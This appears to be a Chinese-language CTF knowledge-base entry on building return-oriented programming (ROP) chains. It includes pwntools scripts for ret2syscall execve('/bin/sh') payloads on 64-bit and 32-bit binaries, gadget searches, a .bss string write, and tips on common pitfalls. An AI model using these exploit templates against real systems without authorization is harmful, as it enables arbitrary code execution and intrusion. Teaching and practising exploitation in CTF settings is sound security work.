---
category: pwn
tags: [rop, rop_chain, gadget, ret2syscall, execve, 返回导向编程, 寄存器控制, calling_convention, ROPgadget, ropper, pwntools, syscall]
triggers: [rop chain, gadget, ret2syscall, pop rdi, pop rsi, pop rdx, syscall execve, calling convention, no libc, static binary, 静态编译, gadget finding, ropper, ROPgadget]
related: [ret2libc, ret2csu, stack_pivot, one_gadget, shellcode]
---

# ROP Chain 构造

## 什么时候用

栈溢出 + NX 开启，需要通过拼接二进制/libc 中已有的代码片段（gadget）来执行任意操作。当目标是静态编译的二进制（没有 libc）或者需要直接 syscall 时，纯 ROP chain 是唯一选择。

## 前提条件

- **栈溢出**：能覆盖返回地址
- **NX 开启**：不能直接执行栈上的 shellcode
- **可找到足够的 gadget**：至少需要控制 rdi/rsi/rdx/rax 和一个 `syscall; ret`
- **已知二进制基地址**：PIE 关闭，或者已泄露代码段地址
- x86-64 调用约定：参数依次放入 rdi、rsi、rdx、rcx、r8、r9
- x86-32 调用约定：参数全部压栈（从右向左）

## 攻击步骤

### 1. 查找 gadget

用 ROPgadget 或 ropper 搜索所需的 gadget：

```bash
# ROPgadget — 搜索所有 gadget
ROPgadget --binary ./vuln | grep "pop rdi"
ROPgadget --binary ./vuln | grep "pop rsi"
ROPgadget --binary ./vuln | grep "pop rax"
ROPgadget --binary ./vuln | grep "syscall"

# ropper — 交互式搜索
ropper -f ./vuln --search "pop rdi; ret"
ropper -f ./vuln --search "pop rax; ret"

# pwntools 自动搜索
from pwn import *
elf = ELF('./vuln')
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
```

常见 gadget 及其来源：
- `pop rdi; ret` — 几乎所有动态链接的 ELF 都有（`__libc_csu_init` 尾部）
- `pop rsi; pop r15; ret` — 同上
- `pop rdx; pop rbx; ret` — 在现代 glibc 中常见（~0x904a9），二进制本身很少有
- `pop rax; ret` — 通常需要从 libc 中找
- `syscall; ret` — libc 中有，静态二进制也有

### 2. 确定溢出偏移

```python
from pwn import *

p = process('./vuln')
p.sendline(cyclic(300))
p.wait()
core = Coredump('./core')
offset = cyclic_find(core.fault_addr)
log.info(f"Offset: {offset}")
```

### 3. 构造 ret2syscall 链（execve("/bin/sh", NULL, NULL)）

x86-64 下 execve 的 syscall 号是 59：

```python
from pwn import *

context.binary = elf = ELF('./vuln')

# 从二进制或 libc 中找 gadget
rop = ROP(elf)
POP_RAX = rop.find_gadget(['pop rax', 'ret'])[0]
POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
POP_RSI = rop.find_gadget(['pop rsi', 'ret'])[0]
POP_RDX_RBX = rop.find_gadget(['pop rdx', 'pop rbx', 'ret'])[0]  # 现代 glibc
SYSCALL_RET = rop.find_gadget(['syscall', 'ret'])[0]
BINSH = next(elf.search(b'/bin/sh'))  # 或自己写入 .bss

payload = b'A' * offset
payload += p64(POP_RAX) + p64(59)          # rax = execve
payload += p64(POP_RDI) + p64(BINSH)      # rdi = "/bin/sh"
payload += p64(POP_RSI) + p64(0)           # rsi = NULL
payload += p64(POP_RDX_RBX) + p64(0) + p64(0)  # rdx = NULL
payload += p64(SYSCALL_RET)

p = process('./vuln')
p.sendline(payload)
p.interactive()
```

### 4. x86-32 的 ROP 链

32 位下参数在栈上，syscall 用 `int 0x80`，execve 号是 11：

```python
from pwn import *

context.binary = elf = ELF('./vuln32')

POP_EAX = 0x080abcde  # 替换为实际地址
POP_EBX = 0x080abcdf
POP_ECX = 0x080abce0
POP_EDX = 0x080abce1
INT80   = 0x080abce2
BINSH   = next(elf.search(b'/bin/sh'))

payload = b'A' * offset
payload += p32(POP_EAX) + p32(11)      # eax = execve
payload += p32(POP_EBX) + p32(BINSH)   # ebx = "/bin/sh"
payload += p32(POP_ECX) + p32(0)        # ecx = NULL
payload += p32(POP_EDX) + p32(0)        # edx = NULL
payload += p32(INT80)

p = process('./vuln32')
p.sendline(payload)
p.interactive()
```

### 5. 没有 "/bin/sh" 时写入 .bss

如果二进制中没有 `/bin/sh` 字符串，可以先用 `read` 写入 `.bss`：

```python
BSS = elf.bss(0x100)  # 可写地址

# 第一段：调 read(0, bss, 8) 将 "/bin/sh\0" 写入 bss
payload = b'A' * offset
payload += p64(POP_RDI) + p64(0)           # fd = stdin
payload += p64(POP_RSI) + p64(BSS)         # buf = bss
payload += p64(POP_RDX_RBX) + p64(8) + p64(0)  # count = 8
payload += p64(elf.plt['read'])
# 紧接着 execve 链...
payload += p64(POP_RAX) + p64(59)
payload += p64(POP_RDI) + p64(BSS)
payload += p64(POP_RSI) + p64(0)
payload += p64(POP_RDX_RBX) + p64(0) + p64(0)
payload += p64(SYSCALL_RET)

p.sendline(payload)
p.send(b'/bin/sh\x00')  # 写入 bss
p.interactive()
```

## 常见坑

- **`pop rdx; ret` 很难找到**：现代 glibc 中独立的 `pop rdx; ret` 几乎不存在，通常是 `pop rdx; pop rbx; ret`（多 pop 一个寄存器）。也可以用 [[ret2csu]] 控制 rdx。
- **栈对齐**：x86-64 调用 libc 函数前 RSP 必须 16 字节对齐。在链中多加一个 `ret` gadget 即可。用 `syscall` 则不需要对齐。
- **puts/printf 泄露后 rdx 被破坏**：调用 `puts` 后 rdx 通常变成很小的值。如果后续需要用 rdx 做参数（如 `read` 的 count），必须重新设置。
- **gadget 地址含 `\x00`**：如果 gadget 地址包含空字节，可能被 `strcpy`/`gets` 截断。尝试用其他 gadget 或考虑 [[stack_pivot]] 把 ROP 链写到别处。
- **静态二进制 gadget 不够**：试试 `ROPgadget --binary ./vuln --ropchain` 自动生成链，或者用 pwntools 的 `ROP.execve()` 自动构造。

## 变体

### pwntools 自动 ROP

pwntools 可以自动构造 ROP 链，特别适合静态二进制：

```python
rop = ROP(elf)
rop.execve(next(elf.search(b'/bin/sh')), 0, 0)
payload = b'A' * offset + rop.chain()
```

### SROP (Sigreturn Oriented Programming)

只需要一个 `syscall; ret` 和控制 rax=15（sigreturn），就能通过伪造信号帧一次性设置所有寄存器。适用于 gadget 极度匮乏的场景。

### DynELF 远程 libc 发现

不知道远程 libc 版本时，用 pwntools 的 `DynELF` 通过反复泄露内存来解析符号表，自动找到 `system` 等函数地址。

## 相关技术

- [[ret2libc]] — 有 libc 时的标准攻击方式
- [[ret2csu]] — 用 `__libc_csu_init` 控制 rdx/rsi/edi
- [[stack_pivot]] — 溢出空间不够时转移栈
- [[one_gadget]] — 单地址 getshell
- [[shellcode]] — NX 关闭时直接写 shellcode
